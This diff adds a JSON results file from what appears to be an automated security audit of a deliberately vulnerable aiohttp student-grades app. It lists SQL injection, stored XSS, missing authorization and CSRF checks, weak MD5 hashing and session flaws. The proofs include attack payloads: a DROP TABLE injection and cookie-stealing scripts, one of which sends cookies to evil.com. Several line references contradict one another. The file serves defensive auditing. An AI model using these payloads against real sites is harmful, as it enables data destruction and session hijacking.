@@ -1,0 +1,761 @@
+{
+  "version": "twin-distill-flash-dsonly",
+  "results": [
+    {
+      "check_id": "twin-round/CWE-89",
+      "path": "sqli/dao/student.py",
+      "start": {
+        "line": 43
+      },
+      "end": {
+        "line": 43
+      },
+      "extra": {
+        "message": "SQL Injection in Student.create() via string interpolation of user-supplied name",
+        "severity": "critical",
+        "metadata": {
+          "cwe": [
+            "CWE-89"
+          ],
+          "citation": "\"VALUES ('%(name)s')\" % {'name': name})",
+          "proof": "SOURCE: views.py:53 reads `data['name']` from the unauthenticated POST body at /students/. SINK: student.py:43 interpolates that value directly into the SQL string with Python's `%` operator instead of using parameterized bindings. An attacker can submit a name like `'); DROP TABLE students; --` to execute arbitrary SQL. All other DAO methods (course.py, mark.py, review.py, user.py) use proper `%(key)s` parameterization with `cur.execute(q, params)`, but this one method uses inline `%` formatting which defeats all database escaping."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "sqli/views.py",
+      "start": {
+        "line": 127
+      },
+      "end": {
+        "line": 127
+      },
+      "extra": {
+        "message": "Missing Authorization on evaluate endpoint \u2014 any unauthenticated user can assign grades",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "async def evaluate(request: Request):",
+          "proof": "SOURCE: The `evaluate()` view at line 127 has NO `@authorize()` decorator (compare with `logout()` at line 156 which does). SINK: line 147 calls `Mark.create(conn, student_id, course_id, data['points'])` which writes grade data into the database for any student/course ID. There is no session check, no role check, and no CSRF token validation (middleware is commented out at app.py:27). An attacker can POST to /students/{student_id}/evaluate/{course_id} with arbitrary points values and manipulate grade records at will."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "sqli/templates/students.jinja2",
+      "start": {
+        "line": 16
+      },
+      "end": {
+        "line": 16
+      },
+      "extra": {
+        "message": "Stored Cross-Site Scripting via student name rendered without escaping in students list",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "<a class=\"collection-item\" href=\"/students/{{ id }}\">{{ name }}</a>",
+          "proof": "SOURCE: views.py:53 reads `data['name']` from POST body (no auth required), then student.py:41-43 stores it in the database. SINK: students.jinja2:16 renders `{{ name }}` with no `|e` escape filter. Global autoescape=False (app.py:35) means Jinja2 does not escape HTML. An attacker submits `<script>fetch('/steal?c='+document.cookie)</script>` as the student name. When any user visits /students/, the script executes. Amplified by middlewares.py:20 where `httponly=False` allows JavaScript to read the session cookie."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "sqli/templates/courses.jinja2",
+      "start": {
+        "line": 17
+      },
+      "end": {
+        "line": 17
+      },
+      "extra": {
+        "message": "Stored Cross-Site Scripting via course title rendered without escaping in courses listing",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "{{ course.title }}",
+          "proof": "SOURCE: views.py:80-82 reads `data['title']` and `data['description']` from POST body (no auth required), then course.py:43-45 stores them. SINK: courses.jinja2:17 renders `{{ course.title }}` with no `|e` filter. Global autoescape=False (app.py:35). An attacker creates a course with title `<img src=x onerror=alert(document.cookie)>` and it executes when any user browses /courses/. The courses.jinja2 listing view uses a simple `{% for course in courses %}` loop with no sanitization."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "sqli/templates/course.jinja2",
+      "start": {
+        "line": 22
+      },
+      "end": {
+        "line": 22
+      },
+      "extra": {
+        "message": "Stored Cross-Site Scripting via course review text rendered without escaping",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "{{ review.review_text }}",
+          "proof": "SOURCE: views.py:116 reads `data.get('review_text')` from POST body at /courses/{course_id}/review (no auth required), then review.py:23-26 stores it. SINK: course.jinja2:22 renders `{{ review.review_text }}` with no `|e` filter. Global autoescape=False (app.py:35). An attacker submits review text containing `<script>document.location='https://evil.com/?c='+document.cookie</script>`. Every user visiting the course detail page triggers the payload. Session cookies lack HttpOnly (middlewares.py:20), enabling direct cookie theft."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-327",
+      "path": "sqli/dao/user.py",
+      "start": {
+        "line": 42
+      },
+      "end": {
+        "line": 42
+      },
+      "extra": {
+        "message": "Weak password hashing using unsalted MD5",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-327"
+          ],
+          "citation": "return self.pwd_hash == md5(password.encode('utf-8')).hexdigest()",
+          "proof": "SINK: user.py:42 uses `hashlib.md5` (a single round of unsalted MD5) to hash passwords for comparison. The fixtures at migrations/001-fixtures.sql use `md5('superadmin')`, `md5('password')`, etc. MD5 can be cracked at billions of hashes per second on consumer hardware. An attacker who extracts the password hashes (via the SQL injection in student.py:43, or a DB dump) can reverse them trivially and authenticate as any user including the admin."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1004",
+      "path": "sqli/middlewares.py",
+      "start": {
+        "line": 20
+      },
+      "end": {
+        "line": 20
+      },
+      "extra": {
+        "message": "Session cookie lacks HttpOnly flag, enabling JavaScript cookie theft via XSS",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-1004"
+          ],
+          "citation": "storage = RedisStorage(app['redis'], httponly=False)",
+          "proof": "SINK: middlewares.py:20 creates a RedisStorage session backend with `httponly=False`. This instructs the browser to allow JavaScript access to the AIOHTTP_SESSION cookie. Combined with any of the stored XSS vulnerabilities (students.jinja2:16, courses.jinja2:17, course.jinja2:22), an attacker can execute `document.cookie` to steal the session identifier, then impersonate the victim. No additional flags (Secure, SameSite) are set either."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "sqli/app.py",
+      "start": {
+        "line": 27
+      },
+      "end": {
+        "line": 27
+      },
+      "extra": {
+        "message": "CSRF middleware commented out \u2014 no server-side CSRF token validation on any POST endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "# csrf_middleware,",
+          "proof": "SOURCE: app.py:27 has `csrf_middleware` commented out of the middleware list. The csrf_processor in jinja2.py:8-13 still generates and stores CSRF tokens in the session, and templates render `{{ csrf_token() }}` in hidden fields, but there is NO middleware validating the submitted token against the session. Every POST handler (login, student creation, course creation, review, evaluation) is vulnerable to Cross-Site Request Forgery. An attacker can craft an HTML form on any external site that auto-submits to POST endpoints, and the victim's browser will execute it if they are authenticated."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-209",
+      "path": "sqli/templates/errors/50x.jinja2",
+      "start": {
+        "line": 6
+      },
+      "end": {
+        "line": 6
+      },
+      "extra": {
+        "message": "Information disclosure via error.__dict__ dump in 500 error template",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-209"
+          ],
+          "citation": "<pre>{{ error.__dict__ }}</pre>",
+          "proof": "SINK: errors/50x.jinja2:6 renders the full Python `__dict__` of any unhandled exception into the HTML page. When a 500 error occurs (triggerable via the `course.name` bug at course.jinja2:3, the `{{ error }}` typo at review.jinja2:26, or any unhandled database exception from the SQL injection at student.py:43), the complete exception object is exposed, including file paths, query strings, stack traces, and framework internals."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-755",
+      "path": "sqli/templates/course.jinja2",
+      "start": {
+        "line": 3
+      },
+      "end": {
+        "line": 3
+      },
+      "extra": {
+        "message": "Undefined template attribute course.name causes 500 error with information disclosure",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-755"
+          ],
+          "citation": "{% block title %}{{ course.name }}{% endblock %}",
+          "proof": "SOURCE: course.jinja2:3 references `course.name` but the `Course` NamedTuple (course.py:6-8) only defines `id`, `title`, and `description` \u2014 it has no `name` field. Jinja2 raises an `UndefinedError` every time this template is rendered (GET /courses/{id}). SINK: This 500 error propagates through the error_middleware (middlewares.py:44-46) which renders errors/50x.jinja2:6, dumping `{{ error.__dict__ }}`. Any visitor to a course detail page inadvertently triggers full internal state disclosure."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-755",
+      "path": "sqli/templates/review.jinja2",
+      "start": {
+        "line": 26
+      },
+      "end": {
+        "line": 26
+      },
+      "extra": {
+        "message": "Undefined template variable {{ error }} causes 500 error with information disclosure",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-755"
+          ],
+          "citation": "<span>{{ fieldname }}: {{ error }}</span>",
+          "proof": "SOURCE: review.jinja2:26 renders `{{ error }}` but the Jinja2 loop on line 25 unpacks `errors.items()` into `fieldname, errors` \u2014 the singular `error` variable is never defined. When form validation fails (e.g., empty review_text on POST to /courses/{course_id}/review), the template crashes with UndefinedError. SINK: crashes propagate to errors/50x.jinja2:6 which dumps `{{ error.__dict__ }}`, leaking internal application state."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "config/dev.yaml",
+      "start": {
+        "line": 2
+      },
+      "end": {
+        "line": 2
+      },
+      "extra": {
+        "message": "Hardcoded database credentials in plaintext config file",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "db:\n  user: postgres\n  password: postgres",
+          "proof": "The config/dev.yaml file at lines 2-3 contains hardcoded plaintext database credentials (`user: postgres`, `password: postgres`). This file is committed to the repository (no .gitignore exclusion for config files). Anyone with source code access gains database credentials. The same credentials are reused in docker-compose.yml for the production database service."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "sqli/views.py",
+      "start": {
+        "line": 58
+      },
+      "end": {
+        "line": 58
+      },
+      "extra": {
+        "message": "Missing Authorization on student creation endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "await Student.create(conn, data['name'])",
+          "proof": "SOURCE: unauthenticated HTTP POST to /students/ with arbitrary 'name' field -> SINK: Student.create() at views.py:58. The students() view (lines 52-61) has no @authorize() decorator and no auth_user check. Any unauthenticated attacker can insert arbitrary student records into the database."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-862",
+      "path": "sqli/views.py",
+      "start": {
+        "line": 87
+      },
+      "end": {
+        "line": 87
+      },
+      "extra": {
+        "message": "Missing Authorization on course creation endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-862"
+          ],
+          "citation": "await Course.create(conn, data['title'],\n                            data['description'])",
+          "proof": "SOURCE: unauthenticated HTTP POST to /courses/ with arbitrary 'title' and 'description' -> SINK: Course.create() at views.py:87-88. The courses() view (lines 81-91) has no @authorize() decorator. The template hides the form behind auth_user.is_admin but a direct POST bypasses this UI-only restriction. Any unauthenticated attacker can create arbitrary courses."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-215",
+      "path": "sqli/app.py",
+      "start": {
+        "line": 24
+      },
+      "end": {
+        "line": 24
+      },
+      "extra": {
+        "message": "Debug mode enabled in production application",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-215"
+          ],
+          "citation": "app = Application(\n    debug=True,\n    middlewares=[",
+          "proof": "The Application() constructor at app.py:23-30 has debug=True, which causes aiohttp to expose detailed stack traces, source code snippets, and local variable dumps on unhandled exceptions. Combined with the undefined-attribute crash in evaluate.jinja2:28 (course.name missing from Course NamedTuple) and other potential errors, this leaks internal application paths and server configuration to any attacker who triggers an error."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "sqli/app.py",
+      "start": {
+        "line": 35
+      },
+      "end": {
+        "line": 35
+      },
+      "extra": {
+        "message": "Jinja2 autoescaping globally disabled \u2014 root cause of all stored XSS",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "setup_jinja(app, loader=PackageLoader('sqli', 'templates'),\n            context_processors=[csrf_processor, auth_user_processor],\n            autoescape=False)",
+          "proof": "setup_jinja() at app.py:33-35 with autoescape=False disables HTML autoescaping globally. Every {{ ... }} expression in every Jinja2 template is rendered without escaping. Without this, the individual XSS issues in course.jinja2:14, course.jinja2:15, course.jinja2:22, course.jinja2:49, student.jinja2:19, and evaluate.jinja2:25 would be mitigated by Jinja2's default autoescaping. Any developer adding a new template is automatically vulnerable."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "sqli/templates/course.jinja2",
+      "start": {
+        "line": 49
+      },
+      "end": {
+        "line": 49
+      },
+      "extra": {
+        "message": "Stored Cross-Site Scripting via student name on course page aside",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "<a href=\"/students/{{ student.id }}\">{{ student.name }}</a>",
+          "proof": "autoescape=False globally. Student name is set via Student.create() (dao/student.py:42) which uses string interpolation \u2014 an attacker can inject a name like <script>alert(1)</script>. The course detail page renders student.name at course.jinja2:49 unescaped in the 'Evaluate students' aside section, executing the payload when an admin views the course page."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "sqli/templates/student.jinja2",
+      "start": {
+        "line": 19
+      },
+      "end": {
+        "line": 19
+      },
+      "extra": {
+        "message": "Stored Cross-Site Scripting via course title on student detail page",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "<span class=\"card-title\">{{ course.title }}</span>",
+          "proof": "autoescape=False globally. Course title is supplied via POST /courses/ -> Course.create(). When viewing a student's marks at /students/{id}, the template iterates courses and renders course.title at line 19 without escaping. Any visitor to a student page with marks sees the injected script."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-79",
+      "path": "sqli/templates/evaluate.jinja2",
+      "start": {
+        "line": 25
+      },
+      "end": {
+        "line": 25
+      },
+      "extra": {
+        "message": "Stored Cross-Site Scripting via student name on evaluate error page",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-79"
+          ],
+          "citation": "Back to student {{ student.name }}",
+          "proof": "autoescape=False globally. When an evaluate POST fails validation (views.py:145-150), evaluate.jinja2 is rendered. Student name from the database is output at line 25 without escaping. An attacker who injected a malicious student name triggers XSS when evaluation fails."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-755",
+      "path": "sqli/templates/evaluate.jinja2",
+      "start": {
+        "line": 28
+      },
+      "end": {
+        "line": 28
+      },
+      "extra": {
+        "message": "Undefined template attribute course.name causes information-disclosing 500 error",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-755"
+          ],
+          "citation": "Back to course {{ course.name }}",
+          "proof": "The Course NamedTuple has attributes id, title, description \u2014 no 'name' attribute. When evaluate POST validation fails (views.py:145-150), the error template evaluate.jinja2 accesses course.name at line 28, triggering an AttributeError. With debug=True in app.py:24, the unhandled exception exposes a full traceback with internal paths and local variables to the attacker."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-384",
+      "path": "sqli/views.py",
+      "start": {
+        "line": 44
+      },
+      "end": {
+        "line": 44
+      },
+      "extra": {
+        "message": "Session Fixation \u2014 session ID not rotated after successful login",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-384"
+          ],
+          "citation": "session['user_id'] = user.id",
+          "proof": "The session object is obtained via get_session(request) at line 29, which retrieves or creates a session identified by the AIOHTTP_SESSION cookie. At line 44, after a successful password check, the authenticated user.id is stored into this same session dict. The session ID cookie is never regenerated or rotated. The cookie is not HttpOnly (middlewares.py:17), so it is readable via XSS. An attacker can force a session ID onto a victim's browser (via XSS), wait for the victim to log in, then re-use the same session cookie to impersonate the authenticated victim."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "sqli/views.py",
+      "start": {
+        "line": 35
+      },
+      "end": {
+        "line": 35
+      },
+      "extra": {
+        "message": "Missing Rate Limiting on Login Endpoint \u2014 unlimited brute-force of credentials",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "if request.method == 'POST':\n        if auth_user:\n            raise HTTPForbidden()\n        data = await request.post()\n        username = data['username']\n        password = data['password']\n        async with app['db'].acquire() as conn:\n            user = await User.get_by_username(conn, username)\n        if user and user.check_password(password):\n            session['user_id'] = user.id",
+          "proof": "The index view handles POST for login at line 35. There is no throttling, account lockout, CAPTCHA, or delay. An unauthenticated attacker can send unlimited POST / requests with different password guesses for any known username. The passwords in seed data (migrations/001-fixtures.sql:10-13) are trivially weak ('superadmin', 'password', 'spidey'), and password hashing uses unsalted MD5 (dao/user.py:44), making brute-force practical."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-798",
+      "path": "migrations/001-fixtures.sql",
+      "start": {
+        "line": 10
+      },
+      "end": {
+        "line": 10
+      },
+      "extra": {
+        "message": "Hardcoded default credentials with trivially guessable passwords",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-798"
+          ],
+          "citation": "VALUES\n  ('Super', NULL, 'Admin', 'superadmin', md5('superadmin'), TRUE),\n  ('John', 'William', 'Doe', 'j.doe', md5('password'), FALSE),\n  ('Stephen', NULL, 'King', 's.king', md5('password'), FALSE),\n  ('Peter', NULL, 'Parker', 'p.parker', md5('spidey'), FALSE);",
+          "proof": "The database seed SQL file at migrations/001-fixtures.sql:10-13 inserts four user accounts with hardcoded plaintext passwords visible in source control. The admin account uses username='superadmin', password='superadmin' (username == password). Three regular users use 'password' and 'spidey'. These passwords are trivial to guess at the login form, which has no rate limiting (CWE-307, views.py:35)."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-215",
+      "path": "run.py",
+      "start": {
+        "line": 12
+      },
+      "end": {
+        "line": 12
+      },
+      "extra": {
+        "message": "DEBUG-Level Logging Enabled",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-215"
+          ],
+          "citation": "logging.basicConfig(level=logging.DEBUG)",
+          "proof": "The root logger is set to DEBUG level at module load time (run.py:12) before the application starts. Combined with Application(debug=True) at app.py:20, both framework-level debug error pages and verbose logging are active simultaneously. Any library or application code logging at DEBUG level will write internal state \u2014 including SQL query parameters, user-supplied data, and session details \u2014 to stdout/stderr."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-613",
+      "path": "sqli/middlewares.py",
+      "start": {
+        "line": 17
+      },
+      "end": {
+        "line": 17
+      },
+      "extra": {
+        "message": "No Session Expiration TTL",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-613"
+          ],
+          "citation": "storage = RedisStorage(app['redis'], httponly=False)",
+          "proof": "RedisStorage is instantiated without a `max_age` parameter, so the session cookie lacks an expiration (browser-session cookie only) AND the Redis key storing session data has no TTL. Combined with the logout function (views.py:167-170) only popping `user_id` from the session rather than clearing it entirely, stale session entries persist in Redis indefinitely. An attacker who captures a session cookie can replay it indefinitely, and Redis memory grows unboundedly."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-614",
+      "path": "sqli/middlewares.py",
+      "start": {
+        "line": 20
+      },
+      "end": {
+        "line": 20
+      },
+      "extra": {
+        "message": "Session Cookie Missing Secure Flag",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-614"
+          ],
+          "citation": "    middleware = session_middleware_(storage)",
+          "proof": "The session middleware is instantiated via `session_middleware_(storage)` without `secure=True`. aiohttp-session defaults `secure=False`, so the `AIOHTTP_SESSION` cookie is transmitted over plain HTTP. The application binds to `0.0.0.0:8080` with no TLS (config/dev.yaml), so an active network attacker on an open Wi-Fi network can intercept the session cookie via passive sniffing and replay it to hijack sessions."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-1275",
+      "path": "sqli/middlewares.py",
+      "start": {
+        "line": 20
+      },
+      "end": {
+        "line": 20
+      },
+      "extra": {
+        "message": "Session Cookie Missing SameSite Attribute",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-1275"
+          ],
+          "citation": "    middleware = session_middleware_(storage)",
+          "proof": "The session middleware factory is called without a `samesite` parameter. aiohttp-session defaults `samesite=None`, meaning the session cookie is attached to all cross-site requests. Combined with the disabled CSRF middleware (app.py:18, commented out), an attacker can mount CSRF attacks from a malicious third-party site \u2014 the victim's browser will automatically include the session cookie in forged requests."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-352",
+      "path": "sqli/templates/course.jinja2",
+      "start": {
+        "line": 45
+      },
+      "end": {
+        "line": 45
+      },
+      "extra": {
+        "message": "Evaluate Student Form Missing CSRF Token",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-352"
+          ],
+          "citation": "<form class=\"collection-item valign-wrapper\"\n                      method=\"POST\"\n                      action=\"/students/{{ student.id }}/evaluate/{{ course.id }}\">",
+          "proof": "The evaluate-student form in course.jinja2 (lines 45-47) submits a POST request without an `<input type=\"hidden\" name=\"_csrf_token\">` field. Every other POST form in the application (login, add-student, add-course, review, logout) includes `_csrf_token`. If the CSRF middleware at app.py:18 were ever re-enabled, all evaluate POSTs would be rejected with 403 because the middleware compares `session.pop('_csrf_token')` to `formdata.get('_csrf_token')` which would be `None`."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-208",
+      "path": "sqli/views.py",
+      "start": {
+        "line": 41
+      },
+      "end": {
+        "line": 41
+      },
+      "extra": {
+        "message": "Timing-Based User Enumeration via Short-Circuit Password Check",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-208"
+          ],
+          "citation": "        if user and user.check_password(password):",
+          "proof": "SOURCE: Attacker-controlled `username` and `password` from POST form data (lines 37-38). SINK: Line 41 uses short-circuit evaluation: if `user` is None (username not found via DB lookup at line 40), `check_password()` \u2014 which computes an MD5 hash and compares strings \u2014 is never called. If the username exists, the hash computation and string comparison execute, creating a measurable timing difference. Repeated requests allow an attacker to enumerate valid usernames by measuring response latency."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-770",
+      "path": "sqli/dao/student.py",
+      "start": {
+        "line": 27
+      },
+      "end": {
+        "line": 27
+      },
+      "extra": {
+        "message": "Unbounded Student Query \u2014 No LIMIT clause",
+        "severity": "low",
+        "metadata": {
+          "cwe": [
+            "CWE-770"
+          ],
+          "citation": "        q = 'SELECT id, name FROM students'",
+          "proof": "SOURCE: Callers at views.py lines 59 and 105 invoke `Student.get_many(conn)` without a `limit` argument. SINK: The method default is `limit=None`, producing `SELECT id, name FROM students` with no LIMIT clause. `await cur.fetchall()` buffers ALL rows in server memory. An attacker can repeatedly call GET /students/ to force cumulative memory exhaustion on both the database and application server."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-770",
+      "path": "sqli/dao/course.py",
+      "start": {
+        "line": 28
+      },
+      "end": {
+        "line": 28
+      },
+      "extra": {
+        "message": "Unbounded Course Query \u2014 No LIMIT clause",
+        "severity": "low",
+        "metadata": {
+          "cwe": [
+            "CWE-770"
+          ],
+          "citation": "        q = 'SELECT id, title, description FROM courses'",
+          "proof": "SOURCE: Callers at views.py lines 72 and 93 invoke `Course.get_many(conn)` without a `limit` argument. SINK: The method default is `limit=None`, producing `SELECT id, title, description FROM courses` with no LIMIT clause. `await cur.fetchall()` returns ALL rows. An attacker can repeatedly call GET /courses/ to force unbounded row retrieval, leading to memory-exhaustion DoS on both DB and application servers."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-770",
+      "path": "sqli/dao/mark.py",
+      "start": {
+        "line": 20
+      },
+      "end": {
+        "line": 20
+      },
+      "extra": {
+        "message": "Unbounded Marks Query for Student \u2014 No LIMIT clause",
+        "severity": "low",
+        "metadata": {
+          "cwe": [
+            "CWE-770"
+          ],
+          "citation": "        q = ('SELECT id, date, student_id, course_id, points '\n             'FROM marks WHERE student_id = %s '\n             'ORDER BY course_id, date')",
+          "proof": "SOURCE: The caller at views.py line 71 invokes `Mark.get_for_student(conn, student_id)` with no LIMIT. SINK: The SQL query has no LIMIT clause, and `await cur.fetchall()` returns ALL marks for the given student across all courses. A student with thousands of grade entries or an attacker targeting a high-volume student ID would cause the server to buffer all rows in memory."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-770",
+      "path": "sqli/dao/review.py",
+      "start": {
+        "line": 19
+      },
+      "end": {
+        "line": 19
+      },
+      "extra": {
+        "message": "Unbounded Review Query for Course (No LIMIT)",
+        "severity": "medium",
+        "metadata": {
+          "cwe": [
+            "CWE-770"
+          ],
+          "citation": "q = ('SELECT id, date, course_id, review_text '\n             'FROM course_reviews WHERE course_id = %s '\n             'ORDER BY date')",
+          "proof": "SOURCE: The `get_for_course` method constructs a SQL query with no LIMIT clause. SINK: `await cur.fetchall()` at line 23 loads ALL matching rows into server memory. An attacker repeatedly calling `GET /courses/{id}` for a course with many reviews forces the server to buffer unbounded rows, causing memory exhaustion. The call at views.py:104 (`reviews = await Review.get_for_course(conn, course_id)`) amplifies the impact since any course page fetches all reviews."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "sqli/views.py",
+      "start": {
+        "line": 55
+      },
+      "end": {
+        "line": 55
+      },
+      "extra": {
+        "message": "Missing Rate Limiting on Student Creation Endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "data = await request.post()\n        async with app['db'].acquire() as conn:\n            await Student.create(conn, data['name'])",
+          "proof": "SOURCE: The `students()` view at line 51 handles `POST /students/` with no `@authorize()` decorator (already-found CWE-862) and no rate-limiting middleware or in-function throttle. SINK: Line 57 calls `Student.create(conn, data['name'])` which also contains a SQL injection sink (already-found CWE-89 at dao/student.py:42). An unauthenticated attacker can POST to `/students/` in a tight loop with arbitrary payloads, creating unlimited students, exhausting database storage, and amplifying the unbounded `Student.get_many()` query DoS."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "sqli/views.py",
+      "start": {
+        "line": 87
+      },
+      "end": {
+        "line": 87
+      },
+      "extra": {
+        "message": "Missing Rate Limiting on Course Creation Endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "data = await request.post()\n        async with app['db'].acquire() as conn:\n            await Course.create(conn, data['title'],\n                                data['description'])",
+          "proof": "SOURCE: The `courses()` view at line 84 handles `POST /courses/` with no `@authorize()` decorator (already-found CWE-862) and no rate limiting. SINK: Lines 88-89 call `Course.create(conn, data['title'], data['description'])`. An unauthenticated attacker can POST to `/courses/` in a tight loop, creating unlimited courses with arbitrary-length title/description strings, exhausting database storage, and amplifying the already-found unbounded `Course.get_many()` DoS."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-307",
+      "path": "sqli/views.py",
+      "start": {
+        "line": 122
+      },
+      "end": {
+        "line": 122
+      },
+      "extra": {
+        "message": "Missing Rate Limiting on Review Creation Endpoint",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-307"
+          ],
+          "citation": "data = await request.post()\n            review_text = data.get('review_text')\n            if not review_text:\n                return {\n                    'course': course,\n                    'errors': {\n                        'review_text': 'this is required field',\n                    },\n                }\n            await Review.create(conn, course_id, review_text)",
+          "proof": "SOURCE: The `review()` view at line 111 handles `POST /courses/{course_id}/review` with no `@authorize()` decorator (already-found CWE-862) and no rate limiting. SINK: Line 128 calls `Review.create(conn, course_id, review_text)`. An unauthenticated attacker can POST reviews in a tight loop to any course ID, creating unlimited review records, exhausting database storage, and amplifying the already-found unbounded `Review.get_for_course()` DoS."
+        }
+      }
+    }
+  ]
+}
